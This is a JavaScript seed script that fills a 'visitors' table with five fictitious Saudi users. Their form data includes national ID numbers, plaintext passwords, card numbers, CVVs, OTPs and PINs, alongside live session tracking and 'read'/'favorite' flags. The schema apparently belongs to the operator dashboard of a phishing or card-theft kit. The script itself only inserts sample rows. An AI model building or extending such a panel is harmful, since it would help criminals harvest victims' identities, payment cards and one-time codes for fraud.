import { drizzle } from 'drizzle-orm/mysql2';
import mysql from 'mysql2/promise';
import { visitors } from './drizzle/schema.js';

const connection = await mysql.createConnection(process.env.DATABASE_URL);
const db = drizzle(connection);

const sampleVisitors = [
  {
    sessionId: 'session-001',
    isOnline: 1,
    lastSeen: new Date(),
    isRead: 0,
    isFavorite: 0,
    currentPage: 'Step 1',
    ipAddress: '192.168.1.100',
    browser: 'Chrome',
    browserVersion: '120.0',
    os: 'Windows',
    osVersion: '11',
    device: 'Desktop',
    deviceModel: 'PC',
    country: 'Saudi Arabia',
    countryCode: 'SA',
    city: 'Riyadh',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    formData: JSON.stringify({
      'Step 1': {
        accountType: 'personal',
        fullName: 'أحمد محمد علي',
        phoneNumber: '+966501234567',
        idNumber: '1234567890'
      }
    })
  },
  {
    sessionId: 'session-002',
    isOnline: 1,
    lastSeen: new Date(),
    isRead: 0,
    isFavorite: 1,
    currentPage: 'Step 3',
    ipAddress: '192.168.1.101',
    browser: 'Safari',
    browserVersion: '17.0',
    os: 'macOS',
    osVersion: '14.0',
    device: 'Desktop',
    deviceModel: 'MacBook Pro',
    country: 'Saudi Arabia',
    countryCode: 'SA',
    city: 'Jeddah',
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    formData: JSON.stringify({
      'Step 1': {
        accountType: 'business',
        fullName: 'فاطمة أحمد',
        phoneNumber: '+966507654321',
        idNumber: '9876543210'
      },
      'Step 2': {
        email: 'fatima@example.com',
        address: 'جدة، المملكة العربية السعودية'
      },
      'Step 3': {
        password: 'MyPassword123!',
        confirmPassword: 'MyPassword123!'
      }
    })
  },
  {
    sessionId: 'session-003',
    isOnline: 0,
    lastSeen: new Date(Date.now() - 3600000),
    isRead: 1,
    isFavorite: 0,
    currentPage: 'Payment',
    ipAddress: '192.168.1.102',
    browser: 'Firefox',
    browserVersion: '121.0',
    os: 'Linux',
    osVersion: 'Ubuntu 22.04',
    device: 'Desktop',
    deviceModel: 'PC',
    country: 'Saudi Arabia',
    countryCode: 'SA',
    city: 'Dammam',
    userAgent: 'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    formData: JSON.stringify({
      'Step 1': {
        accountType: 'personal',
        fullName: 'خالد عبدالله',
        phoneNumber: '+966509876543',
        residenceNumber: '2345678901'
      },
      'Step 2': {
        email: 'khaled@example.com',
        address: 'الدمام، المملكة العربية السعودية'
      },
      'Step 3': {
        password: 'SecurePass456!',
        confirmPassword: 'SecurePass456!'
      },
      'Payment': {
        cardNumber: '4532123456789012',
        cvv: '123',
        expiryDate: '12/25',
        otp: '456789',
        pin: '1234'
      }
    })
  },
  {
    sessionId: 'session-004',
    isOnline: 1,
    lastSeen: new Date(),
    isRead: 0,
    isFavorite: 0,
    currentPage: 'Step 2',
    ipAddress: '10.0.0.50',
    browser: 'Chrome',
    browserVersion: '120.0',
    os: 'Android',
    osVersion: '14',
    device: 'Mobile',
    deviceModel: 'Samsung Galaxy S23',
    country: 'Saudi Arabia',
    countryCode: 'SA',
    city: 'Mecca',
    userAgent: 'Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36',
    formData: JSON.stringify({
      'Step 1': {
        accountType: 'personal',
        fullName: 'نورة سعيد',
        phoneNumber: '+966551234567',
        idNumber: '3456789012'
      },
      'Step 2': {
        email: 'noura@example.com',
        address: 'مكة المكرمة، المملكة العربية السعودية'
      }
    })
  },
  {
    sessionId: 'session-005',
    isOnline: 0,
    lastSeen: new Date(Date.now() - 7200000),
    isRead: 1,
    isFavorite: 1,
    currentPage: 'Verification',
    ipAddress: '172.16.0.25',
    browser: 'Safari',
    browserVersion: '17.2',
    os: 'iOS',
    osVersion: '17.2',
    device: 'Mobile',
    deviceModel: 'iPhone 15 Pro',
    country: 'Saudi Arabia',
    countryCode: 'SA',
    city: 'Medina',
    userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
    formData: JSON.stringify({
      'Step 1': {
        accountType: 'business',
        fullName: 'عبدالرحمن محمود',
        phoneNumber: '+966558765432',
        idNumber: '4567890123'
      },
      'Step 2': {
        email: 'abdulrahman@example.com',
        address: 'المدينة المنورة، المملكة العربية السعودية'
      },
      'Step 3': {
        password: 'StrongPass789!',
        confirmPassword: 'StrongPass789!'
      },
      'Payment': {
        cardNumber: '5412345678901234',
        cvv: '456',
        expiryDate: '06/26',
        otp: '789012',
        pin: '5678'
      },
      'Verification': {
        verificationCode: '123456',
        documentType: 'National ID',
        documentNumber: '4567890123'
      }
    })
  }
];

console.log('🌱 Seeding visitors...');

for (const visitor of sampleVisitors) {
  await db.insert(visitors).values(visitor);
  console.log(`✅ Added visitor: ${JSON.parse(visitor.formData)['Step 1']?.fullName || 'Unknown'}`);
}

console.log('✨ Seeding completed!');
process.exit(0);
